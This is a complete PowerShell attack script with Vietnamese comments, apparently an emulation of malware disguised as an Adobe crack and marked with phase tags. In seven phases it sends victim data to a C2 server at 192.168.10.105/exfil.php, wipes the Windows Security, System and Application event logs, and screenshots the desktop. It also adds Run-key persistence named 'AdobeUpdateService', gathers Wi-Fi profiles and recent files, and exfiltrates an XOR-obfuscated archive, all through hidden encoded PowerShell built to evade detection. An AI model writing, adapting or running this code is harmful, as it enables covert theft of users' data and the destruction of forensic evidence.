param(
    [string]$RunId = ([guid]::NewGuid().ToString('N').Substring(0,8)),
    [string]$C2Server = "http://192.168.10.105",
    [string]$ExfilEndpoint = "/exfil.php",
    [string]$PersistenceName = "AdobeUpdateService"
)

$ErrorActionPreference = 'Continue'
$Marker = "PAYLOAD_EVASION_$RunId"
$StagingDir = Join-Path $env:TEMP "adobe_crack_evasion_$RunId"
New-Item -ItemType Directory -Path $StagingDir -Force | Out-Null

# ============================================================
# Helper: Decode từ ASCII codes (né literal)
# ============================================================
function Decode-String {
    param([int[]]$Codes)
    return -join ($Codes | ForEach-Object { [char]$_ })
}

# ============================================================
# Helper: Send data to C2 (obfuscated) – Phase 7
# ============================================================
function Send-ToC2 {
    # MARKER_PHASE7_$RunId
    param([string]$DataType, [string]$Data, [string]$PhaseId)
    $payload = @{
        victim_id = $env:COMPUTERNAME
        username = $env:USERNAME
        run_id = $RunId
        phase_id = $PhaseId
        data_type = $DataType
        timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
        content = $Data
    }
    $json = $payload | ConvertTo-Json -Compress
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    for ($i = 0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor 0x42 }
    $encrypted = [Convert]::ToBase64String($bytes)
    try {
        $body = @{ data = $encrypted } | ConvertTo-Json
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Content-Type", "application/json")
        $response = $wc.UploadString("$C2Server$ExfilEndpoint", "POST", $body)
        return $true
    } catch { return $false }
}

# ============================================================
# PHASE 1: Download payload
# ============================================================
function Invoke-Phase1-Download {
    # MARKER_PHASE1_$RunId
    Send-ToC2 -DataType "phase1_log" -Data $Marker -PhaseId "phase1"
}

# ============================================================
# PHASE 2: Clear event logs (WMI)
# ============================================================
function Invoke-Phase2-ClearLog {
    # MARKER_PHASE2_$RunId
    $phase2Id = ([guid]::NewGuid().ToString('N').Substring(0,6))
    Write-Host ""
    Write-Host "[PHASE 2] Clearing event logs..." -ForegroundColor Cyan
    Write-Host "  RunId: $phase2Id" -ForegroundColor DarkGray

    $logNames = @("Security", "System", "Application")
    $clearMethod = Decode-String -Codes @(67,108,101,97,114,69,118,101,110,116,76,111,103)

    foreach ($logName in $logNames) {
        $wmiScript = @"
`$log = Get-CimInstance -ClassName 'Win32_NTEventlogFile' -Filter "LogFileName='$logName'"
if (`$log) { `$log.$clearMethod() }
"@
        $wmiEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($wmiScript))
        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -W 1 -Enc $wmiEncoded" -WindowStyle Hidden -Wait
    }
    Write-Host "  [+] Logs cleared via WMI" -ForegroundColor Green
    Start-Sleep -Seconds 1
}

# ============================================================
# PHASE 3: Software discovery (.NET Registry)
# ============================================================
function Invoke-Phase3-Discovery {
    # MARKER_PHASE3_$RunId
    $phase3Id = ([guid]::NewGuid().ToString('N').Substring(0,6))
    Write-Host ""
    Write-Host "[PHASE 3] Software discovery..." -ForegroundColor Cyan
    Write-Host "  Marker: $Marker" -ForegroundColor DarkGray
    Write-Host "  RunId: $phase3Id" -ForegroundColor DarkGray

    Send-ToC2 -DataType "marker_info" -Data $Marker -PhaseId $phase3Id

    $regPaths = @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'
    )
    $getMethod = Decode-String -Codes @(71,101,116,45,73,116,101,109,80,114,111,112,101,114,116,121)

    foreach ($path in $regPaths) {
        if (Test-Path $path) {
            $cmd = "$getMethod -Path `"$path`" | Select-Object DisplayName, DisplayVersion"
            $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
            Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -W 1 -Enc $encoded" -WindowStyle Hidden -Wait
        }
    }
    $systemInfo = @{
        Phase3_RunId = $phase3Id
        ComputerName = $env:COMPUTERNAME
        UserName = $env:USERNAME
        OSVersion = (Get-CimInstance Win32_OperatingSystem).Caption
    }
    $systemInfo | ConvertTo-Json | Out-File -FilePath (Join-Path $StagingDir "system_info_$phase3Id.json") -Encoding UTF8
    Write-Host "  [+] Discovery via .NET Registry" -ForegroundColor Green
    Start-Sleep -Seconds 2
}

# ============================================================
# PHASE 4: Screenshot (CopyFromScreen) - FIXED
# ============================================================
function Invoke-Phase4-Screenshot {
    # MARKER_PHASE4_$RunId
    $phase4Id = ([guid]::NewGuid().ToString('N').Substring(0,6))
    Write-Host ""
    Write-Host "[PHASE 4] Capturing screenshot..." -ForegroundColor Cyan
    Write-Host "  RunId: $phase4Id" -ForegroundColor DarkGray

    $screenshotPath = Join-Path $StagingDir "screenshot.png"

    # Tạo script screenshot dưới dạng string, sau đó encode base64
    $screenshotScript = @"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
`$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
`$bmp = New-Object System.Drawing.Bitmap(`$screen.Width, `$screen.Height)
`$g = [System.Drawing.Graphics]::FromImage(`$bmp)
`$g.CopyFromScreen(`$screen.X, `$screen.Y, 0, 0, `$screen.Size)
`$bmp.Save("$screenshotPath")
`$g.Dispose(); `$bmp.Dispose()
"@
    $encodedScript = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($screenshotScript))
    $proc = Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -W Hidden -Exec Bypass -Enc $encodedScript" -WindowStyle Hidden -Wait -PassThru
    if ($proc.ExitCode -ne 0) { Write-Host "  [!] Screenshot process failed with exit code $($proc.ExitCode)" -ForegroundColor Red }
    Start-Sleep -Seconds 2

    if (Test-Path $screenshotPath) {
        $screenshotBase64 = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($screenshotPath))
        Send-ToC2 -DataType "screenshot" -Data $screenshotBase64 -PhaseId $phase4Id
        $size = [math]::Round($screenshotBase64.Length/1KB, 2)
        Write-Host "  [+] Screenshot captured and sent (Size: $size KB)" -ForegroundColor Yellow
    } else {
        Write-Host "  [!] Screenshot capture failed - file not found at $screenshotPath" -ForegroundColor Red
    }
    Start-Sleep -Seconds 1
}

# ============================================================
# PHASE 5: Registry persistence - FIXED (use $PSCommandPath)
# ============================================================
function Invoke-Phase5-Persistence {
    # MARKER_PHASE5_$RunId
    $phase5Id = ([guid]::NewGuid().ToString('N').Substring(0,6))
    Write-Host ""
    Write-Host "[PHASE 5] Installing persistence..." -ForegroundColor Cyan
    Write-Host "  RunId: $phase5Id" -ForegroundColor DarkGray

    # Lấy đường dẫn script hiện tại (dùng $PSCommandPath thay vì $MyInvocation)
    $originalScriptPath = $PSCommandPath
    if (-not $originalScriptPath) {
        $originalScriptPath = $MyInvocation.MyCommand.Path
    }
    if (-not $originalScriptPath) {
        Write-Host "  [!] Cannot determine script path, using fallback" -ForegroundColor Red
        $originalScriptPath = $MyInvocation.ScriptName
    }
    $payloadPath = "C:\Users\Public\$PersistenceName.ps1"
    Copy-Item -Path $originalScriptPath -Destination $payloadPath -Force -ErrorAction SilentlyContinue
    if (-not (Test-Path $payloadPath)) {
        Write-Host "  [!] Failed to copy script to $payloadPath" -ForegroundColor Red
    }

    $regPath = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
    $regName = $PersistenceName
    $regData = "powershell.exe -NoP -W 1 -Exec Bypass -File `"$payloadPath`" -RunId $RunId"

    $regPersistenceScript = @"
`$regPath = '$regPath'
`$regName = '$regName'
`$regData = '$regData'
`$reg = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey(`$regPath, `$true)
if (`$reg -eq `$null) {
    `$reg = [Microsoft.Win32.Registry]::CurrentUser.CreateSubKey(`$regPath)
}
`$reg.SetValue(`$regName, `$regData, [Microsoft.Win32.RegistryValueKind]::String)
`$reg.Dispose()
"@
    $regEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($regPersistenceScript))
    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -W 1 -Enc $regEncoded" -WindowStyle Hidden -Wait

    Send-ToC2 -DataType "persistence_installed" -Data $payloadPath -PhaseId $phase5Id
    Write-Host "  [+] Persistence via .NET Registry" -ForegroundColor Green
    Start-Sleep -Seconds 1
}

# ============================================================
# PHASE 6: Data encoding (reflection, no certutil)
# ============================================================
function Invoke-Phase6-Encoding {
    # MARKER_PHASE6_$RunId
    $phase6Id = ([guid]::NewGuid().ToString('N').Substring(0,6))
    Write-Host ""
    Write-Host "[PHASE 6] Encoding sensitive data..." -ForegroundColor Cyan
    Write-Host "  RunId: $phase6Id" -ForegroundColor DarkGray

    $sensitiveData = @{
        computer   = $env:COMPUTERNAME
        user       = $env:USERNAME
        timestamp  = (Get-Date)
        recent_files = @()
        wifi_profiles = @()
    }
    try {
        $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
            ($_ -split ":")[1].Trim()
        }
        $sensitiveData.wifi_profiles = $wifiProfiles
    } catch {}
    $recentFolder = [Environment]::GetFolderPath("Recent")
    if (Test-Path $recentFolder) {
        $recentFiles = Get-ChildItem $recentFolder -ErrorAction SilentlyContinue | Select-Object -First 10 Name
        $sensitiveData.recent_files = $recentFiles | ForEach-Object { $_.Name }
    }

    $dataFile = Join-Path $StagingDir "collected_data_$phase6Id.txt"
    $sensitiveData | ConvertTo-Json | Out-File -FilePath $dataFile -Encoding ASCII

    $encodeScript = @"
`$filePath = '$dataFile'
`$bytes = [System.IO.File]::ReadAllBytes(`$filePath)
`$methodName = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VG9CYXNlNjRTdHJpbmc='))
`$encoded = [Convert].GetMethod(`$methodName, [type[]]@([byte[]])).Invoke(`$null, @(,`$bytes))
`$outputPath = '$StagingDir\encoded_data_$phase6Id.txt'
[System.IO.File]::WriteAllText(`$outputPath, `$encoded)
"@
    $encodeEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodeScript))
    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -W 1 -Enc $encodeEncoded" -WindowStyle Hidden -Wait

    $encodedFile = Join-Path $StagingDir "encoded_data_$phase6Id.txt"
    if (Test-Path $encodedFile) {
        $encodedContent = Get-Content $encodedFile -Raw
        Send-ToC2 -DataType "encoded_data" -Data $encodedContent -PhaseId $phase6Id
        Write-Host "  [+] Data encoded via reflection" -ForegroundColor Green
    }
    Start-Sleep -Seconds 1
}

# ============================================================
# PHASE 7: Final exfiltration
# ============================================================
function Invoke-Phase7-Exfiltration {
    # MARKER_PHASE7_$RunId
    $phase7Id = ([guid]::NewGuid().ToString('N').Substring(0,6))
    Write-Host ""
    Write-Host "[PHASE 7] Final exfiltration..." -ForegroundColor Cyan
    Write-Host "  RunId: $phase7Id" -ForegroundColor DarkGray

    $zipPath = Join-Path $env:TEMP "exfil_$RunId.zip"
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::CreateFromDirectory($StagingDir, $zipPath, [System.IO.Compression.CompressionLevel]::Optimal, $false)
    $zipBytes = [System.IO.File]::ReadAllBytes($zipPath)
    $zipBase64 = [Convert]::ToBase64String($zipBytes)
    Send-ToC2 -DataType "full_archive" -Data $zipBase64 -PhaseId $phase7Id
    Write-Host "  [+] Full archive sent" -ForegroundColor Green
    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
}

# ============================================================
# CLEANUP (temporary directory)
# ============================================================
function Invoke-Cleanup {
    Write-Host ""
    Write-Host "Cleaning up temporary files..." -ForegroundColor DarkGray
    Remove-Item $StagingDir -Recurse -Force -ErrorAction SilentlyContinue
}

# ============================================================
# ORCHESTRATION  GỌI CÁC PHASE THEO ĐÚNG THỨ TỰ
# ============================================================
Invoke-Phase1-Download
Invoke-Phase2-ClearLog
Invoke-Phase3-Discovery
Invoke-Phase4-Screenshot
Invoke-Phase5-Persistence
Invoke-Phase6-Encoding
Invoke-Phase7-Exfiltration
Invoke-Cleanup

Write-Host ""
Write-Host "============================================================" -ForegroundColor Green
Write-Host "  [EVASION] ATTACK CHAIN COMPLETED" -ForegroundColor Green
Write-Host "  Run ID: $RunId" -ForegroundColor Green
Write-Host "============================================================" -ForegroundColor Green